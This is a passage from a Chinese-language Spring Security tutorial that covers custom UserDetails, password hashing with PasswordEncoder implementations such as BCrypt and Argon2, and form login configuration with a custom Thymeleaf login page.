<span class="built_in">this</span>.role = role;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Collection&lt;? <span class="keyword">extends</span> <span class="title class_">GrantedAuthority</span>&gt; getAuthorities() &#123;</span><br><span class="line">        <span class="keyword">return</span> Collections.singleton(<span class="keyword">new</span> <span class="title class_">SimpleGrantedAuthority</span>(role));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getPassword</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUsername</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> username;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAccountNonExpired</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UserDetails.<span class="built_in">super</span>.isAccountNonExpired();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isAccountNonLocked</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UserDetails.<span class="built_in">super</span>.isAccountNonLocked();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isCredentialsNonExpired</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UserDetails.<span class="built_in">super</span>.isCredentialsNonExpired();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEnabled</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> UserDetails.<span class="built_in">super</span>.isEnabled();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>这样做的好处</strong>:</p>
<ul>
<li><strong>代码更简洁</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyUserDetailsService</span> <span class="keyword">implements</span> <span class="title class_">UserDetailsService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserMapper userMapper;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> UserDetails <span class="title function_">loadUserByUsername</span><span class="params">(String username)</span> <span class="keyword">throws</span> UsernameNotFoundException &#123;</span><br><span class="line">        log.info(<span class="string">&quot;loadUserByUsername: &#123;&#125;&quot;</span>, username);</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> userMapper</span><br><span class="line">                .selectOne(<span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;User&gt;()</span><br><span class="line">                        .eq(User::getUsername, username));</span><br><span class="line">        Optional.ofNullable(user).orElseThrow(() -&gt; <span class="keyword">new</span> <span class="title class_">UsernameNotFoundException</span>(<span class="string">&quot;用户不存在&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MyUserDetails</span>(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>信息更丰富</strong>: <code>Authentication</code> 对象的 <code>getPrincipal()</code> 方法将返回我们完整的 <code>User</code> 实体，你可以在业务代码中方便地获取用户ID、邮箱等任何信息。</li>
</ul>
<hr>
<h3 id="2-3-PasswordEncoder-的选择与使用"><a href="#2-3-PasswordEncoder-的选择与使用" class="headerlink" title="2.3 PasswordEncoder 的选择与使用"></a>2.3 <code>PasswordEncoder</code> 的选择与使用</h3><p><code>PasswordEncoder</code> 是 Spring Security 提供的一个核心服务接口，专门用于处理密码的<strong>单向加密（哈希）和 验证</strong>。在现代 Web 应用中，直接存储用户明文密码是绝对禁止的严重安全漏洞。</p>
<h4 id="2-3-1-为什么不能明文存储密码？"><a href="#2-3-1-为什么不能明文存储密码？" class="headerlink" title="2.3.1 为什么不能明文存储密码？"></a>2.3.1 为什么不能明文存储密码？</h4><ol>
<li><strong>数据库泄露风险</strong>：如果你的数据库被黑客拖库（整个数据库被盗走），所有用户的密码将瞬间暴露无遗。攻击者可以利用这些密码尝试登录用户的其他网站账户（因为很多用户习惯在不同网站使用相同密码），造成巨大损失。</li>
<li><strong>内部人员风险</strong>：能够接触到数据库的内部员工（DBA、运维、开发人员）可以看到所有用户的密码，这带来了极大的隐私和安全风险。</li>
<li><strong>违反合规性要求</strong>：许多数据保护法规（如 GDPR）明确要求对敏感个人数据进行加密保护，明文存储密码是违规行为。</li>
</ol>
<hr>
<h4 id="2-3-2-什么是安全的密码存储？——-自适应单向函数"><a href="#2-3-2-什么是安全的密码存储？——-自适应单向函数" class="headerlink" title="2.3.2 什么是安全的密码存储？—— 自适应单向函数"></a>2.3.2 什么是安全的密码存储？—— 自适应单向函数</h4><p>一个安全的密码存储方案，不仅仅是做一次简单的哈希（如 MD5 或 SHA-1），而是需要使用<strong>自适应单向函数 (Adaptive One-way Function)</strong>。这类函数有几个关键特性：</p>
<ol>
<li><strong>单向性 (One-way)</strong>：从原始密码计算出哈希值非常容易，但从哈希值反推出原始密码在计算上是不可行的。MD5 和 SHA 系列都具备此特性。</li>
<li><strong>加盐 (Salting)</strong>：在对密码进行哈希计算之前，会为每个密码自动生成一个随机的字符串（称为“盐”），并将其与密码结合在一起。<ul>
<li><strong>作用</strong>：即使两个用户设置了完全相同的密码（如 “123456”），由于他们的“盐”是不同的，最终存储在数据库中的哈希值也是完全不同的。这有效抵御了<strong>彩虹表攻击 (Rainbow Table Attack)</strong>。</li>
</ul>
</li>
<li><strong>慢速与可配置的工作因子 (Slow &amp; Configurable Work Factor)</strong>：这类算法被设计成<strong>计算密集型</strong>的，即计算一次哈希需要消耗相对较多的 CPU 或内存资源。<ul>
<li><strong>作用</strong>：这极大地增加了<strong>暴力破解 (Brute-force Attack)</strong> 的成本。攻击者即使拿到了数据库，也无法在短时间内尝试大量的密码组合。</li>
<li><strong>自适应</strong>：随着计算机硬件性能的提升，我们可以通过调整<strong>工作因子（Work Factor）</strong>（也叫成本、迭代次数）来增加计算的耗时，使得破解成本始终保持在一个非常高的水平。</li>
</ul>
</li>
</ol>
<p><strong>已经被淘汰的算法</strong>：</p>
<ul>
<li><strong>MD5, SHA-1, SHA-256</strong>: 这些是快速哈希算法，不包含加盐和慢速特性，非常容易被现代硬件暴力破解，<strong>绝对不能</strong>用于存储密码。</li>
</ul>
<hr>
<h4 id="2-3-3-Spring-Security-提供的-PasswordEncoder-实现"><a href="#2-3-3-Spring-Security-提供的-PasswordEncoder-实现" class="headerlink" title="2.3.3 Spring Security 提供的 PasswordEncoder 实现"></a>2.3.3 Spring Security 提供的 <code>PasswordEncoder</code> 实现</h4><p>Spring Security 提供了一系列实现了上述安全特性的 <code>PasswordEncoder</code>，封装在 <code>spring-security-crypto</code> 模块中。</p>
<table>
<thead>
<tr>
<th>编码器</th>
<th>算法</th>
<th>特点</th>
<th>推荐度</th>
</tr>
</thead>
<tbody><tr>
<td><code>BCryptPasswordEncoder</code></td>
<td>BCrypt</td>
<td><strong>业界标准，最广泛使用</strong>。基于 Blowfish 加密算法，计算密集。工作因子可调（强度，默认为10）。</td>
<td><strong>强烈推荐 (默认首选)</strong></td>
</tr>
<tr>
<td><code>SCryptPasswordEncoder</code></td>
<td>SCrypt</td>
<td><strong>内存消耗型</strong>。除了 CPU 成本，还要求大量的内存，使其更难被 GPU 或 ASIC 硬件并行破解。</td>
<td><strong>推荐</strong> (比 BCrypt 更安全，但需要更多内存)</td>
</tr>
<tr>
<td><code>Argon2PasswordEncoder</code></td>
<td>Argon2</td>
<td><strong>密码哈希竞赛冠军</strong>。现代、安全，同时对抗 CPU、GPU 和内存攻击。是未来的趋势。</td>
<td><strong>推荐</strong> (最安全的选择之一，需要 Bouncy Castle 依赖)</td>
</tr>
<tr>
<td><code>Pbkdf2PasswordEncoder</code></td>
<td>PBKDF2</td>
<td>一个较老的标准，安全性不如前三者，但仍可接受。</td>
<td>不推荐在新项目中使用，除非有兼容性要求。</td>
</tr>
</tbody></table>
<p><strong><code>DelegatingPasswordEncoder</code></strong>:</p>
<p>这是一个特殊的“代理”编码器，也是 Spring Security <strong>默认</strong>使用的。它的设计目标是为了<strong>平滑地升级密码存储策略</strong>。</p>
<ul>
<li><strong>工作原理</strong>：它生成的哈希值会带有一个<strong>前缀</strong>，用于标识该密码是使用哪种算法加密的。例如：<ul>
<li><code>{bcrypt}$2a$10$dXJ3SW6G7P50lGmMkkmwe.20cQQubK3.HZWzG3YB1j...</code></li>
<li><code>{argon2}$...</code></li>
</ul>
</li>
<li><strong>优点</strong>：<ol>
<li><strong>验证</strong>：当验证密码时，<code>DelegatingPasswordEncoder</code> 会根据前缀选择正确的编码器进行 <code>matches</code> 操作。</li>
<li><strong>升级</strong>：你可以配置它默认使用新的算法（如 Argon2）。新注册的用户或修改密码的用户会使用新算法存储。而老用户登录时，它仍然能用旧的算法（如 BCrypt）去验证他们的密码。这使得系统可以在不强制所有用户重置密码的情况下，逐步迁移到更安全的算法。</li>
</ol>
</li>
</ul>
<hr>
<h4 id="2-3-4-如何使用-PasswordEncoder"><a href="#2-3-4-如何使用-PasswordEncoder" class="headerlink" title="2.3.4 如何使用 PasswordEncoder"></a>2.3.4 如何使用 <code>PasswordEncoder</code></h4><h5 id="1-声明-Bean"><a href="#1-声明-Bean" class="headerlink" title="1. 声明 Bean"></a>1. 声明 Bean</h5><p>在你的 <code>@Configuration</code> 类中，必须将一个 <code>PasswordEncoder</code> 实例声明为 Spring Bean。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> PasswordEncoder <span class="title function_">passwordEncoder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 返回一个 BCryptPasswordEncoder 实例</span></span><br><span class="line">        <span class="comment">// 构造函数可以接受一个 &quot;strength&quot; 参数 (4-31)，默认是 10。</span></span><br><span class="line">        <span class="comment">// 数字越大，计算越慢，密码越安全，但认证耗时也越长。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BCryptPasswordEncoder</span>(); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 如果你想使用 DelegatingPasswordEncoder (Spring Boot 默认行为)</span></span><br><span class="line">    <span class="comment">// import org.springframework.security.crypto.factory.PasswordEncoderFactories;</span></span><br><span class="line">    <span class="comment">// @Bean</span></span><br><span class="line">    <span class="comment">// public PasswordEncoder passwordEncoder() &#123;</span></span><br><span class="line">    <span class="comment">//     return PasswordEncoderFactories.createDelegatingPasswordEncoder();</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Spring Boot 会自动配置 <code>DelegatingPasswordEncoder</code>，所以通常你只需要提供一个具体的实现（如 <code>BCryptPasswordEncoder</code>），Spring Security 会自动使用它。</strong></p>
<hr>
<h5 id="2-在注册-修改密码时进行编码"><a href="#2-在注册-修改密码时进行编码" class="headerlink" title="2. 在注册&#x2F;修改密码时进行编码"></a>2. 在注册&#x2F;修改密码时进行编码</h5><p>当用户注册或修改密码时，<strong>永远不要</strong>将明文密码存入数据库。必须先使用 <code>passwordEncoder</code> 进行编码。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="meta">@RequiredArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;UserMapper, User&gt; <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> PasswordEncoder passwordEncoder;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerUser</span><span class="params">(String username, String rawPassword)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setUsername(username);</span><br><span class="line">        <span class="comment">// 关键步骤：对明文密码进行编码</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">encodedPassword</span> <span class="operator">=</span> passwordEncoder.encode(rawPassword);</span><br><span class="line">        user.setPassword(encodedPassword);</span><br><span class="line">        </span><br><span class="line">        save(user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编码后的密码（一个长得像乱码的字符串）将被存入数据库的 <code>password</code> 字段。</p>
<hr>
<h5 id="3-Spring-Security-自动进行验证"><a href="#3-Spring-Security-自动进行验证" class="headerlink" title="3. Spring Security 自动进行验证"></a>3. Spring Security 自动进行验证</h5><p>你<strong>不需要</strong>手动调用 <code>passwordEncoder.matches()</code>。</p>
<p>在认证流程（<code>2.1</code> 节已详述）中，<code>DaoAuthenticationProvider</code> 会被自动注入你声明的 <code>PasswordEncoder</code> Bean。当它从 <code>UserDetailsService</code> 加载到 <code>UserDetails</code> 后，会自动调用 <code>passwordEncoder.matches(rawPassword, encodedPassword)</code> 来进行密码比对，其中：</p>
<ul>
<li><code>rawPassword</code>: 是用户在登录表单中输入的明文密码。</li>
<li><code>encodedPassword</code>: 是从 <code>UserDetails</code> (即数据库) 中获取的已编码密码。</li>
</ul>
<hr>
<h3 id="2-4-常见的认证方式配置"><a href="#2-4-常见的认证方式配置" class="headerlink" title="2.4 常见的认证方式配置"></a>2.4 常见的认证方式配置</h3><p>Spring Security 提供了多种开箱即用的认证机制，以适应不同的应用场景。这里我们重点介绍三种最常见的：Form Login、HTTP Basic 和 Remember-Me。</p>
<h4 id="2-4-1-基于表单的认证-Form-Login"><a href="#2-4-1-基于表单的认证-Form-Login" class="headerlink" title="2.4.1 基于表单的认证 (Form Login)"></a>2.4.1 基于表单的认证 (Form Login)</h4><p>这是最常见的一种认证方式，适用于所有面向普通用户的 Web 应用程序。用户通过一个 HTML 表单提交用户名和密码来进行登录。</p>
<h5 id="1-默认的-Form-Login"><a href="#1-默认的-Form-Login" class="headerlink" title="1. 默认的 Form Login"></a>1. 默认的 Form Login</h5><p>只需在 <code>SecurityFilterChain</code> 配置中加入 <code>.formLogin()</code> 即可启用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    http</span><br><span class="line">        .authorizeHttpRequests(auth -&gt; auth.anyRequest().authenticated())</span><br><span class="line">        .formLogin(Customizer.withDefaults()); <span class="comment">// 使用默认配置启用表单登录</span></span><br><span class="line">    <span class="keyword">return</span> http.build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这会自动提供一个由 Spring Security 生成的登录页面（在 <code>/login</code>），并处理 <code>POST /login</code> 的登录请求。</p>
<hr>
<h5 id="2-自定义登录页面"><a href="#2-自定义登录页面" class="headerlink" title="2. 自定义登录页面"></a>2. 自定义登录页面</h5><p>在真实项目中，我们总是需要一个自定义的、符合网站风格的登录页面。</p>
<p><strong>步骤 1: 创建登录页面的 Controller</strong></p>
<p>你需要一个 Controller 来返回登录页面的视图。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">loginPage</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>; <span class="comment">// 返回视图名，例如 login.html (使用Thymeleaf)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>步骤 2: 创建登录页面 (e.g., <code>src/main/resources/templates/login.html</code>)</strong></p>
<p>页面中的表单需要遵循一些约定：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns:th</span>=<span class="string">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Login Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Please sign in<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 显示登录失败的错误信息 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;param.error&#125;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: red;&quot;</span>&gt;</span></span><br><span class="line">        Invalid username or password.</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 显示注销成功的信息 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;param.logout&#125;&quot;</span> <span class="attr">style</span>=<span class="string">&quot;color: green;&quot;</span>&gt;</span></span><br><span class="line">        You have been logged out.</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 登录表单 --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- th:action=&quot;@&#123;/login&#125;&quot; 会自动处理 context path --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- action=&quot;/login&quot; 也可以，处理登录的 URL 默认为 /login --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">th:action</span>=<span class="string">&quot;@&#123;/login&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>Username:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- name=&quot;username&quot; 是默认的用户名参数名 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">autofocus</span>=<span class="string">&quot;autofocus&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span>&gt;</span>Password:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- name=&quot;password&quot; 是默认的密码参数名 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 默认开启 CSRF 防护，Thymeleaf 会自动在表单中添加一个隐藏的 _csrf token --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">th:name</span>=<span class="string">&quot;$&#123;_csrf.parameterName&#125;&quot;</span> <span class="attr">th:value</span>=<span class="string">&quot;$&#123;_csrf.token&#125;&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Sign In<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>action</code> 必须指向 Spring Security 处理登录的 URL (默认为 <code>POST /login</code>)。</li>
<li>用户名输入框的 <code>name</code> 属性默认为 <code>username</code>。</li>
<li>密码输入框的 <code>name</code> 属性默认为 <code>password</code>。</li>
<li>如果启用了 CSRF 防护（默认开启），表单中必须包含 CSRF token。Thymeleaf 会自动处理。</li>
</ul>
<p><strong>步骤 3: 更新 Security 配置</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> PasswordEncoder <span class="title function_">passwordEncoder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">BCryptPasswordEncoder</span>(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> SecurityFilterChain <span class="title function_">filterChain</span><span class="params">(HttpSecurity http)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        http</span><br><span class="line">                .authorizeHttpRequests(authorize -&gt; authorize</span><br><span class="line">                        .requestMatchers(<span class="string">&quot;/dashboard&quot;</span>).hasRole(<span class="string">&quot;ADMIN&quot;</span>) <span class="comment">// /dashboard 只有 ADMIN 角色可以访问</span></span><br><span class="line">                        .requestMatchers(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;/login&quot;</span>,<span class="string">&quot;/css/**&quot;</span>, <span class="string">&quot;/js/**&quot;</span>).permitAll() <span class="comment">// 首页与登陆页允许所有用户访问</span></span><br><span class="line">                        .anyRequest().authenticated() <span class="comment">// 其他所有请求都需要认证</span></span><br><span class="line">                )</span><br><span class="line">                .formLogin(form -&gt; form</span><br><span class="line">                        .loginPage(<span class="string">&quot;/login&quot;</span>) <span class="comment">// 指定自定义登录页的URL</span></span><br><span class="line">                        .loginProcessingUrl(<span class="string">&quot;/login&quot;</span>) <span class="comment">// 指定处理登录请求的URL (默认为/login)</span></span><br><span class="line">                        .usernameParameter(<span class="string">&quot;username&quot;</span>) <span class="comment">// 自定义用户名字段名 (默认为username)</span></span><br><span class="line">                        .passwordParameter(<span class="string">&quot;password&quot;</span>) <span class="comment">// 自定义密码字段名 (默认为password)</span></span><br><span class="line">                        .defaultSuccessUrl(<span class="string">&quot;/&quot;</span>, <span class="literal">true</span>) <span class="comment">// 登录成功后的默认重定向地址, true表示总是重定向</span></span><br><span class="line">                        .failureUrl(<span class="string">&quot;/login?error&quot;</span>) <span class="comment">// 登录失败后重定向的地址</span></span><br><span class="line">                        .permitAll() <span class="comment">// 必须允许所有人访问登录相关的URL</span></span><br><span class="line">                )</span><br><span class="line">                .logout(logout -&gt; logout</span><br><span class="line">                        .logoutSuccessUrl(<span class="string">&quot;/&quot;</span>) <span class="comment">// 注销成功后重定向到首页</span></span><br><span class="line">                );</span><br><span class="line">        <span class="keyword">return</span> http.build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>.loginPage(&quot;/login&quot;)</code>: 告诉 Spring Security 你的登录页在 <code>/login</code>，当未认证用户访问受保护资源时，将他们重定向到这里。</li>
<li><code>.loginProcessingUrl(&quot;/login&quot;)</code>: 指定 <code>UsernamePasswordAuthenticationFilter</code> 监听哪个 URL 来处理登录提交。</li>
<li><code>.defaultSuccessUrl(...)</code>: 登录成功后跳转的页面。如果设置为 <code>true</code>，则总是跳转到此页面；如果为 <code>false</code>（默认），则会跳转到用户在登录前尝试访问的页面。</li>
<li><code>.failureUrl(...)</code>: 登录失败后跳转的页面。我们通常会附带一个参数（如 <code>error</code>）用于在页面上显示提示信息。</li>
<li>最后，非常重要的一点是，<strong>必须将登录页面本身设置为 <code>permitAll()</code></strong>，否则用户将陷入无限重定向的循环。</li>
</ul>
<hr>
<h4 id="2-4-2-HTTP-Basic-认证"><a href="#2-4-2-HTTP-Basic-认证" class="headerlink" title="2.4.2 HTTP Basic 认证"></a>2.4.2 HTTP Basic 认证</h4><p>HTTP Basic 认证是一种更简单的认证方案，它不依赖 HTML 表单，而是直接使用 HTTP Header 来传递凭证。</p>
<h5 id="1-适用场景"><a href="#1-适用场景" class="headerlink" title="1. 适用场景"></a>1. 适用场景</h5><ul>
<li><strong>无状态的 RESTful API</strong>: 特别适合用于程序间的调用，例如脚本、微服务间的通信。</li>
<li><strong>简单的后台管理接口</strong>: 对于内部系统或对用户体验要求不高的场景，可以快速提供安全保护。</li>
